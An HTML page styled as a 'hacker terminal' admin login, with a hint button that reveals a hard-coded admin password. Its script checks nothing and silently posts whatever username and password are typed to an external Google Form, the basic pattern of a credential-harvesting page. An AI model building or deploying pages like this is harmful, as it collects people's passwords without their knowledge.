<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Super Admin Hacker Terminal Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0;
        }
        .terminal-container {
            background: #111;
            padding: 20px;
            border: 2px solid #0f0;
            border-radius: 5px;
            width: 90%;
            max-width: 400px;
            text-align: left;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
        }
        .terminal-container h1 {
            margin-bottom: 15px;
            font-size: 20px;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .form-group {
            margin: 15px 0;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #0f0;
        }
        .form-group input[type="text"],
        .form-group input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 2px solid #0f0;
            border-radius: 3px;
            background: #000;
            color: #0f0;
            font-size: 16px;
            outline: none;
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
        }
        .form-group input::placeholder {
            color: #0f0;
            opacity: 0.7;
        }
        .form-group input[type="submit"] {
            background: #000;
            color: #0f0;
            padding: 10px 20px;
            border: 2px solid #0f0;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            transition: background 0.3s ease, color 0.3s ease;
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
        }
        .form-group input[type="submit"]:hover {
            background: #0f0;
            color: #000;
        }
        .hint-button {
            margin-top: 10px;
            background: transparent;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 5px 10px;
            cursor: pointer;
            font-family: 'Courier New', Courier, monospace;
            font-size: 14px;
            border-radius: 3px;
            transition: background 0.3s ease;
        }
        .hint-button:hover {
            background: #0f0;
            color: #000;
        }
        .message, .hint {
            margin-top: 10px;
            font-size: 14px;
        }
        .hint {
            color: #ff0;
            display: none; /* Hidden by default */
        }
    </style>
</head>
<body>
    <div class="terminal-container">
        <h1>Super Admin Terminal Login</h1>
        <form id="login-form">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" name="entry.1108830450" id="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" name="entry.850744854" id="password" placeholder="Enter your password" required>
            </div>
            <div class="form-group">
                <input type="submit" value="Login">
            </div>
        </form>
        <button class="hint-button" id="hint-button">Show Password Hint</button>
        <div class="message" id="message"></div>
        <div class="hint" id="hint">User: admin<br>Password: ab12cd34</div>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form from redirecting

            const formData = new FormData(this);
            const formAction = 'https://docs.google.com/forms/d/1IEsX-1XvlogRsprTXArAgIM_CLFjVWuUtemC_6dGGm8/formResponse';

            fetch(formAction, {
                method: 'POST',
                body: formData,
                mode: 'no-cors'
            })
            .then(() => {
                document.getElementById('message').textContent = 'Form submitted successfully!';
                document.getElementById('message').style.color = '#0f0';
            })
            .catch(() => {
                document.getElementById('message').textContent = 'There was an error submitting the form.';
                document.getElementById('message').style.color = '#f00';
            });
        });

        // Show/hide hint on button click
        document.getElementById('hint-button').addEventListener('click', function() {
            const hint = document.getElementById('hint');
            if (hint.style.display === 'none' || hint.style.display === '') {
                hint.style.display = 'block';
            } else {
                hint.style.display = 'none';
            }
        });
    </script>
</body>
</html>
